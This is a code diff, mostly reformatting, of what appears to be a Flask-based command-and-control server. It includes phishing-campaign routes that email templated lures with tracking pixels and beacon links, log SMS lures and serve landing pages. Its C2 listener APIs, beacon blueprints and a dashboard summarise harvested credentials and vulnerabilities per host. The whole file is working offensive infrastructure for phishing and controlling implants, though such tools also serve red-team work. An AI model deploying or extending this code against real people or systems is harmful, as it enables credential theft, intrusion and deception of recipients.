 def orchestrate_campaign(campaign_id):
-    campaign_file = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml')
+    campaign_file = os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml")
     campaign = load_yaml_safely(campaign_file)
     if not campaign:
         abort(404)
-    campaign['id'] = campaign_id
+    campaign["id"] = campaign_id
 
-    if request.method == 'GET':
-        return render_template('phishing/orchestrate_campaign.html', campaign=campaign)
+    if request.method == "GET":
+        return render_template("phishing/orchestrate_campaign.html", campaign=campaign)
 
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
-    cursor.execute('SELECT email, event_type, ip, timestamp FROM multivector_tracking WHERE campaign_id = ?', (campaign_id,))
-    events = [{'email': row[0], 'event_type': row[1], 'ip': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
+    cursor.execute(
+        "SELECT email, event_type, ip, timestamp FROM multivector_tracking WHERE campaign_id = ?", (campaign_id,)
+    )
+    events = [{"email": row[0], "event_type": row[1], "ip": row[2], "timestamp": row[3]} for row in cursor.fetchall()]
     conn.close()
 
     adaptations = analyze_campaign_progress(campaign_id, events)
     short_urls = load_short_urls()
-    new_short_url = adaptations.get('short_url', secrets.token_urlsafe(6))
-    beacon_url = campaign.get('beacon_url', '') if 'vectors' not in campaign else campaign['vectors'].get('email', {}).get('beacon_url', '')
+    new_short_url = adaptations.get("short_url", secrets.token_urlsafe(6))
+    beacon_url = (
+        campaign.get("beacon_url", "")
+        if "vectors" not in campaign
+        else campaign["vectors"].get("email", {}).get("beacon_url", "")
+    )
     short_urls[new_short_url] = {
-        'original_url': adaptations.get('payload', beacon_url),
-        'active': True,
-        'created_at': datetime.now().isoformat()
+        "original_url": adaptations.get("payload", beacon_url),
+        "active": True,
+        "created_at": datetime.now().isoformat(),
     }
     save_short_urls(short_urls)
 
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute(
-        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
-        (campaign_id, 'unknown', adaptations['vector'], request.remote_addr, datetime.now().isoformat())
+        "INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
+        (campaign_id, "unknown", adaptations["vector"], request.remote_addr, datetime.now().isoformat()),
     )
     conn.commit()
     conn.close()
 
-    return jsonify({'status': 'adapted', 'vector': adaptations['vector'], 'short_url': new_short_url})
+    return jsonify({"status": "adapted", "vector": adaptations["vector"], "short_url": new_short_url})
 
 
-@phishing_bp.route('/phishing/create_multivector_campaign', methods=['GET', 'POST'])
+@phishing_bp.route("/phishing/create_multivector_campaign", methods=["GET", "POST"])
 @login_required
 def create_multivector_campaign():
-    if request.method == 'GET':
-
+    if request.method == "GET":
         token = secrets.token_urlsafe(32)
         expiry = int(time.time()) + 3600
 
-
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
-        cursor.execute('''CREATE TABLE IF NOT EXISTS auth_tokens
-                         (user_id INTEGER, token TEXT, expiry INTEGER)''')
-        cursor.execute('INSERT INTO auth_tokens (user_id, token, expiry) VALUES (?, ?, ?)',
-                       (current_user.id, token, expiry))
+        cursor.execute("""CREATE TABLE IF NOT EXISTS auth_tokens
+                         (user_id INTEGER, token TEXT, expiry INTEGER)""")
+        cursor.execute(
+            "INSERT INTO auth_tokens (user_id, token, expiry) VALUES (?, ?, ?)", (current_user.id, token, expiry)
+        )
         conn.commit()
         conn.close()
 
-        return render_template('phishing/create_multivector_campaign.html',
-                              auth_token=token)
+        return render_template("phishing/create_multivector_campaign.html", auth_token=token)
 
-    if request.method == 'POST':
-        yaml_input = request.form.get('yaml_input')
-        auth_token = request.form.get('auth_token')
-
+    if request.method == "POST":
+        yaml_input = request.form.get("yaml_input")
+        auth_token = request.form.get("auth_token")
 
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
-        cursor.execute('SELECT expiry FROM auth_tokens WHERE user_id = ? AND token = ?',
-                       (current_user.id, auth_token))
+        cursor.execute("SELECT expiry FROM auth_tokens WHERE user_id = ? AND token = ?", (current_user.id, auth_token))
         result = cursor.fetchone()
         conn.close()
 
         if not result or result[0] < int(time.time()):
-            flash('Invalid or expired authentication token.', 'error')
-            return redirect(url_for('phishing.create_multivector_campaign'))
+            flash("Invalid or expired authentication token.", "error")
+            return redirect(url_for("phishing.create_multivector_campaign"))
 
         if not yaml_input:
-            flash('YAML input is required.', 'error')
-            return redirect(url_for('phishing.create_multivector_campaign'))
+            flash("YAML input is required.", "error")
+            return redirect(url_for("phishing.create_multivector_campaign"))
 
         try:
             data = yaml.safe_load(yaml_input)
-            if not data or not data.get('name') or not data.get('vectors'):
-                flash('Campaign name and vectors are required.', 'error')
-                return redirect(url_for('phishing.create_multivector_campaign'))
+            if not data or not data.get("name") or not data.get("vectors"):
+                flash("Campaign name and vectors are required.", "error")
+                return redirect(url_for("phishing.create_multivector_campaign"))
         except yaml.YAMLError as e:
             logger.error(f"Invalid YAML input: {e}")
-            flash('Invalid YAML format. Check your syntax and try again.', 'error')
-            return redirect(url_for('phishing.create_multivector_campaign'))
+            flash("Invalid YAML format. Check your syntax and try again.", "error")
+            return redirect(url_for("phishing.create_multivector_campaign"))
 
         campaign_id = str(uuid.uuid4())
         campaign = {
-            'id': campaign_id,
-            'name': data['name'],
-            'vectors': data.get('vectors', {}),
-            'created_at': datetime.now().isoformat()
+            "id": campaign_id,
+            "name": data["name"],
+            "vectors": data.get("vectors", {}),
+            "created_at": datetime.now().isoformat(),
         }
         try:
-            with open(os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml'), 'w') as f:
+            with open(os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml"), "w") as f:
                 yaml.safe_dump(campaign, f)
             logger.info(f"Created multi-vector campaign: {campaign_id}")
         except Exception as e:
             logger.error(f"Error saving campaign {campaign_id}: {e}")
-            flash('Failed to save campaign.', 'error')
-            return redirect(url_for('phishing.create_multivector_campaign'))
+            flash("Failed to save campaign.", "error")
+            return redirect(url_for("phishing.create_multivector_campaign"))
 
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
         short_urls = load_short_urls()
 
-        if 'email' in campaign['vectors']:
-            email_vector = campaign['vectors']['email']
+        if "email" in campaign["vectors"]:
+            email_vector = campaign["vectors"]["email"]
             template_file = os.path.join(TEMPLATES_DIR, f"{email_vector.get('template', '')}.yaml")
             template = load_yaml_safely(template_file)
             if not template:
-                flash('Invalid email template.', 'error')
-                return redirect(url_for('phishing.create_multivector_campaign'))
-            beacon_url = email_vector.get('beacon_url', '')
+                flash("Invalid email template.", "error")
+                return redirect(url_for("phishing.create_multivector_campaign"))
+            beacon_url = email_vector.get("beacon_url", "")
             if not beacon_url:
                 short_url = secrets.token_urlsafe(6)
                 short_urls[short_url] = {
-                    'original_url': f'http://{request.host}/track/{short_url}',
-                    'active': True,
-                    'created_at': datetime.now().isoformat()
+                    "original_url": f"http://{request.host}/track/{short_url}",
+                    "active": True,
+                    "created_at": datetime.now().isoformat(),
                 }
-                beacon_url = f'http://{request.host}/{short_url}'
-                campaign['vectors']['email']['beacon_url'] = beacon_url
+                beacon_url = f"http://{request.host}/{short_url}"
+                campaign["vectors"]["email"]["beacon_url"] = beacon_url
             with yagmail.SMTP(GMAIL_ADDRESS, GMAIL_APP_PASSWORD) as yag:
-                for recipient in email_vector.get('recipients', []):
-                    tracking_url = url_for('phishing.track_pixel', campaign_id=campaign_id, email=recipient, _external=True)
-                    html_body = template['body'].format(
-                        name=recipient.split('@')[0],
+                for recipient in email_vector.get("recipients", []):
+                    tracking_url = url_for(
+                        "phishing.track_pixel", campaign_id=campaign_id, email=recipient, _external=True
+                    )
+                    html_body = template["body"].format(
+                        name=recipient.split("@")[0],
                         beacon_url=beacon_url,
-                        tracking_pixel=f'<img src="{tracking_url}" width="1" height="1" alt="" />'
+                        tracking_pixel=f'<img src="{tracking_url}" width="1" height="1" alt="" />',
                     )
-                    yag.send(
-                        to=recipient,
-                        subject=template['subject'],
-                        contents=html_body
-                    )
+                    yag.send(to=recipient, subject=template["subject"], contents=html_body)
                     cursor.execute(
-                        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
-                        (campaign_id, recipient, 'email_sent', request.remote_addr, datetime.now().isoformat())
+                        "INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
+                        (campaign_id, recipient, "email_sent", request.remote_addr, datetime.now().isoformat()),
                     )
 
-        if 'sms' in campaign['vectors']:
-            sms_vector = campaign['vectors']['sms']
-            beacon_url = sms_vector.get('beacon_url', '')
+        if "sms" in campaign["vectors"]:
+            sms_vector = campaign["vectors"]["sms"]
+            beacon_url = sms_vector.get("beacon_url", "")
             if not beacon_url:
                 short_url = secrets.token_urlsafe(6)
                 short_urls[short_url] = {
-                    'original_url': f'http://{request.host}/track/{short_url}',
-                    'active': True,
-                    'created_at': datetime.now().isoformat()
+                    "original_url": f"http://{request.host}/track/{short_url}",
+                    "active": True,
+                    "created_at": datetime.now().isoformat(),
                 }
-                beacon_url = f'http://{request.host}/{short_url}'
-                campaign['vectors']['sms']['beacon_url'] = beacon_url
-            message = sms_vector.get('message', '')
-            for recipient in sms_vector.get('recipients', []):
+                beacon_url = f"http://{request.host}/{short_url}"
+                campaign["vectors"]["sms"]["beacon_url"] = beacon_url
+            message = sms_vector.get("message", "")
+            for recipient in sms_vector.get("recipients", []):
                 try:
                     formatted_message = message.format(beacon_url=beacon_url)
                     logger.info(f"Sent SMS to {recipient} with message: {formatted_message}")
                     cursor.execute(
-                        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
-                        (campaign_id, recipient, 'sms_sent', request.remote_addr, datetime.now().isoformat())
+                        "INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
+                        (campaign_id, recipient, "sms_sent", request.remote_addr, datetime.now().isoformat()),
                     )
                 except Exception as e:
                     logger.error(f"Error sending SMS to {recipient}: {e}")
 
-        if 'landing_page' in campaign['vectors']:
-            landing_vector = campaign['vectors']['landing_page']
-            beacon_url = landing_vector.get('beacon_url', '')
+        if "landing_page" in campaign["vectors"]:
+            landing_vector = campaign["vectors"]["landing_page"]
+            beacon_url = landing_vector.get("beacon_url", "")
             if not beacon_url:
                 short_url = secrets.token_urlsafe(6)
                 short_urls[short_url] = {
-                    'original_url': f'http://{request.host}/track/{short_url}',
-                    'active': True,
-                    'created_at': datetime.now().isoformat()
+                    "original_url": f"http://{request.host}/track/{short_url}",
+                    "active": True,
+                    "created_at": datetime.now().isoformat(),
                 }
-                beacon_url = f'http://{request.host}/{short_url}'
-                campaign['vectors']['landing_page']['beacon_url'] = beacon_url
+                beacon_url = f"http://{request.host}/{short_url}"
+                campaign["vectors"]["landing_page"]["beacon_url"] = beacon_url
 
-            template_name = landing_vector.get('template', '')
+            template_name = landing_vector.get("template", "")
             if template_name:
                 cursor.execute(
-                    'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
-                    (campaign_id, 'unknown', 'landing_page_created', request.remote_addr, datetime.now().isoformat())
+                    "INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
+                    (campaign_id, "unknown", "landing_page_created", request.remote_addr, datetime.now().isoformat()),
                 )
         save_short_urls(short_urls)
         conn.commit()
         conn.close()
 
-        with open(os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml'), 'w') as f:
+        with open(os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml"), "w") as f:
             yaml.safe_dump(campaign, f)
 
+        return jsonify({"campaign_id": campaign_id, "message": "Multi-vector campaign created successfully"}), 200
 
-        return jsonify({'campaign_id': campaign_id, 'message': 'Multi-vector campaign created successfully'}), 200
 
-
-@phishing_bp.route('/phishing/landing/<campaign_id>/<short_url>')
+@phishing_bp.route("/phishing/landing/<campaign_id>/<short_url>")
 def serve_landing_page(campaign_id, short_url):
-    campaign_file = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml')
+    campaign_file = os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml")
     campaign = load_yaml_safely(campaign_file)
-    if not campaign or 'landing_page' not in campaign.get('vectors', {}):
+    if not campaign or "landing_page" not in campaign.get("vectors", {}):
         abort(404)
     short_urls = load_short_urls()
-    if short_url not in short_urls or not short_urls[short_url]['active']:
+    if short_url not in short_urls or not short_urls[short_url]["active"]:
         abort(404)
-    template_name = campaign['vectors']['landing_page'].get('template', '')
+    template_name = campaign["vectors"]["landing_page"].get("template", "")
     if not template_name:
         abort(404)
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute(
-        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
-        (campaign_id, 'unknown', 'landing_page_visit', request.remote_addr, datetime.now().isoformat())
+        "INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
+        (campaign_id, "unknown", "landing_page_visit", request.remote_addr, datetime.now().isoformat()),
     )
     conn.commit()
     conn.close()
-    return render_template(f'phishing/landing_pages/{template_name}.html', beacon_url=short_urls[short_url]['original_url'])
+    return render_template(
+        f"phishing/landing_pages/{template_name}.html", beacon_url=short_urls[short_url]["original_url"]
+    )
 
-@app.route('/health', methods=['GET'])
+
+@app.route("/health", methods=["GET"])
 def health_check():
     """Basic health and readiness endpoint."""
-    import pathlib
     import sqlite3 as _sqlite3
 
     status = {"status": "healthy", "checks": {}}
@@ -5327,6 +8381,18 @@ def health_check():
     except Exception as e:
         logger.error(f"Health check database failed: {e}")
         status["checks"]["database"] = "error"
+    try:
+        from skills.daemon_health import daemon_status as _ds
+        from skills.daemon_health import is_daemon_alive
+
+        if is_daemon_alive():
+            status["checks"]["autonomous_daemon"] = "ok"
+            status["daemon"] = _ds()
+        else:
+            status["checks"]["autonomous_daemon"] = "stopped"
+    except Exception as e:
+        logger.error(f"Health check autonomous_daemon failed: {e}")
+        status["checks"]["autonomous_daemon"] = "error"
     any_error = any(v != "ok" for v in status["checks"].values())
     code = 503 if any_error else 200
     if any_error:
@@ -5334,22 +8400,22 @@ def health_check():
     return jsonify(status), code
 
 
-@app.route('/metrics', methods=['GET'])
+@app.route("/metrics", methods=["GET"])
 def metrics_exposition():
     """Prometheus-compatible metrics endpoint."""
-    return Response(REGISTRY.prometheus_text(), mimetype='text/plain')
+    return Response(REGISTRY.prometheus_text(), mimetype="text/plain")
 
 
-@app.route('/api/dashboard', methods=['GET'])
+@app.route("/api/dashboard", methods=["GET"])
 @requires_auth
 def api_dashboard():
     """Aggregated JSON dashboard: beacons, campaign, events, facts summary."""
     import pathlib
 
     sessions_path = pathlib.Path(SESSIONS_DIR)
-    events_file   = sessions_path / "events.jsonl"
+    events_file = sessions_path / "events.jsonl"
     campaign_file = sessions_path / "campaign.json"
-    facts_file    = sessions_path / "policy_facts.json"
+    facts_file = sessions_path / "policy_facts.json"
 
     # ── Recent events (last 20) ───────────────────────────────────────────────
     recent_events: list = []
@@ -5379,11 +8445,11 @@ def api_dashboard():
             raw_facts = json.loads(facts_file.read_text(errors="replace"))
             for host, hdata in raw_facts.items():
                 facts_summary[host] = {
-                    "services":       len(hdata.get("services", {})),
-                    "credentials":    len(hdata.get("credentials", [])),
+                    "services": len(hdata.get("services", {})),
+                    "credentials": len(hdata.get("credentials", [])),
                     "vulnerabilities": len(hdata.get("vulnerabilities", [])),
-                    "paths":          len(hdata.get("paths", [])),
-                    "os_hint":        hdata.get("os_hint", ""),
+                    "paths": len(hdata.get("paths", [])),
+                    "os_hint": hdata.get("os_hint", ""),
                 }
         except Exception:
             pass
@@ -5392,41 +8458,48 @@ def api_dashboard():
     beacon_count = len([k for k, v in results.items() if isinstance(v, dict)])
 
     payload = {
-        "beacon_count":    beacon_count,
-        "active_beacons":  list(results.keys()),
-        "recent_events":   recent_events,
-        "campaign":        campaign_summary,
-        "facts_by_host":   facts_summary,
+        "beacon_count": beacon_count,
+        "active_beacons": list(results.keys()),
+        "recent_events": recent_events,
+        "campaign": campaign_summary,
+        "facts_by_host": facts_summary,
     }
+    try:
+        from modules.killchain import KillChain as _KC
+
+        payload["killchain"] = _KC.snapshot()
+    except Exception:
+        payload["killchain"] = {}
     return jsonify(payload)
 
 
 # ── Listener Management API ───────────────────────────────────────────────
 
-@app.route('/api/listeners', methods=['GET'])
+
+@app.route("/api/listeners", methods=["GET"])
 @requires_auth
 def api_listeners():
     """List all configured C2 listeners and their runtime status."""
     return jsonify({"listeners": listener_manager.status()})
 
 
-@app.route('/api/listeners', methods=['POST'])
+@app.route("/api/listeners", methods=["POST"])
 @requires_auth
 def api_listeners_create():
     """Create a new listener."""
     data = request.get_json(silent=True) or {}
-    port = data.get('port')
+    port = data.get("port")
     if not port or not isinstance(port, int):
         return jsonify({"status": "error", "message": "port (int) is required"}), 400
-    ssl_flag = data.get('ssl', False)
-    listener_id = data.get('id')
+    ssl_flag = data.get("ssl", False)
+    listener_id = data.get("id")
     listener = listener_manager.add(port=port, ssl=ssl_flag, listener_id=listener_id)
-    if data.get('start', True):
+    if data.get("start", True):
         listener_manager.start(listener.id)
     return jsonify({"status": "ok", "listener": listener.to_dict()})
 
 
-@app.route('/api/listeners/<listener_id>/start', methods=['POST'])
+@app.route("/api/listeners/<listener_id>/start", methods=["POST"])
 @requires_auth
 def api_listeners_start(listener_id):
     """Start an existing listener."""
@@ -5434,7 +8507,7 @@ def api_listeners_start(listener_id):
     return jsonify({"status": "ok" if ok else "error"})
 
 
-@app.route('/api/listeners/<listener_id>/stop', methods=['POST'])
+@app.route("/api/listeners/<listener_id>/stop", methods=["POST"])
 @requires_auth
 def api_listeners_stop(listener_id):
     """Stop a running listener."""
@@ -5442,7 +8515,7 @@ def api_listeners_stop(listener_id):
     return jsonify({"status": "ok" if ok else "error"})
 
 
-@app.route('/api/listeners/<listener_id>', methods=['DELETE'])
+@app.route("/api/listeners/<listener_id>", methods=["DELETE"])
 @requires_auth
 def api_listeners_delete(listener_id):
     """Remove a listener configuration."""
@@ -5450,14 +8523,65 @@ def api_listeners_delete(listener_id):
     return jsonify({"status": "ok" if ok else "error"})
 
 
+try:
+    from lazyc2.blueprints import addons_bp, api_bp, auth_bp, beacon_bp, init_beacon_bp, operations_bp, redirect_bp
+
+    init_beacon_bp(
+        commands=commands,
+        results=results,
+        commands_history=commands_history,
+        connected_clients=connected_clients,
+        encrypt_fn=encrypt_data,
+        decrypt_fn=decrypt_data,
+        config=config,
+        sessions_dir=SESSIONS_DIR,
+        route_malleable=route_malleable,
+    )
+    app.register_blueprint(operations_bp)
+    app.register_blueprint(auth_bp)
+
+    app.register_blueprint(beacon_bp)
+    app.register_blueprint(redirect_bp)
+    app.register_blueprint(api_bp)
+    app.register_blueprint(addons_bp)
+except Exception as _obp_err:
+    print(f"[c2] Blueprint not loaded: {_obp_err}")
+
 thread = Thread(target=run_shell)
 thread.daemon = False
 thread.start()
 
-if __name__ == '__main__':
-
-    path = os.getcwd().replace("modules", "sessions" )
+if __name__ == "__main__":
+    path = os.getcwd().replace("modules", "sessions")
     uploads = f"{path}/uploads"
+
+    # ── Session at-rest crypto ──────────────────────────────────────────────
+    # The C2 must operate on plaintext session files (world_model.json,
+    # key.aes, credentials) while running. Decrypt on boot and re-encrypt on
+    # a clean shutdown with the same derived key as the CLI, so a session
+    # shared between either surface stays decryptable by the other.
+    _auto_crypto_engine = None
+    try:
+        from cli.auto_crypto import AutoCryptoConfig as _ACC
+        from cli.auto_crypto import AutoCryptoEngine as _ACE
+        from cli.auto_crypto import build_password_provider_from_cli_login
+
+        _provider = build_password_provider_from_cli_login() or (lambda: None)
+        _auto_crypto_engine = _ACE(
+            config=_ACC(
+                sessions_dir="sessions",
+                auto_enabled=True,
+                password_provider=_provider,
+            )
+        )
+        _auto_crypto_engine.decrypt_session()
+        import atexit as _c2_atexit
+
+        _c2_atexit.register(_auto_crypto_engine.encrypt_session)
+        print("[crypto] Session state restored for the run (re-encrypted on clean exit).")
+    except Exception as crypto_err:
+        print(f"[crypto] auto-encrypt/decrypt init failed: {crypto_err}")
+
     dns_thread = threading.Thread(target=start_dns_server, daemon=True)
     dns_thread.start()
     watching_thread = threading.Thread(target=start_watching, daemon=True)
@@ -5471,6 +8595,7 @@ if __name__ == '__main__':
     try:
         sys.path.insert(0, os.path.join(os.path.dirname(__file__), "modules"))
         from dashboard_bp import dashboard_bp
+
         app.register_blueprint(dashboard_bp, url_prefix="/dashboard")
     except Exception as _dbp_err:
         print(f"[dashboard] Blueprint not loaded: {_dbp_err}")
@@ -5478,6 +8603,7 @@ if __name__ == '__main__':
     try:
         sys.path.insert(0, os.path.join(os.path.dirname(__file__), "modules"))
         from collab_bp import collab_bp
+
         app.config["LAZYOWN_CONFIG"] = config
         app.register_blueprint(collab_bp, url_prefix="/collab")
         print("[collab] Multi-operator collaboration active at /collab/")
@@ -5485,11 +8611,23 @@ if __name__ == '__main__':
         print(f"[collab] Blueprint not loaded: {_cbp_err}")
 
     # ── Multi-listener bootstrap ─────────────────────────────────────────────
-    # Backwards compatibility: if no listeners are configured, create the
-    # legacy default listener on ``lport`` so existing workflows keep working.
-    if not listener_manager.listeners:
-        ssl_default = ENV == 'PROD' and os.path.exists('cert.pem') and os.path.exists('key.pem')
-        listener_manager.add(port=int(lport), ssl=ssl_default, listener_id='default')
+    # Backwards compatibility: ensure the default listener always exists
+    # and always uses SSL when the certificate pair is present.
+    ssl_default = os.path.exists("cert.pem") and os.path.exists("key.pem")
+    if not ssl_default:
+        print("[listener] cert.pem/key.pem not found — starting without SSL")
+    # Remove any stale persisted config so a fresh listener is always created
+    # with the current SSL setting (avoids cached ssl=False from previous runs).
+    listener_manager.remove("default")
+    listener_manager.add(port=int(lport), ssl=ssl_default, listener_id="default")
+
+    try:
+        from modules.event_consumers import wire_all_consumers as _wire_consumers
+
+        _wire_consumers()
+        print("[c2] Event consumers wired")
+    except Exception as _ew_err:
+        print(f"[c2] Event consumers not wired: {_ew_err}")
 
     listener_manager.start_all()
 
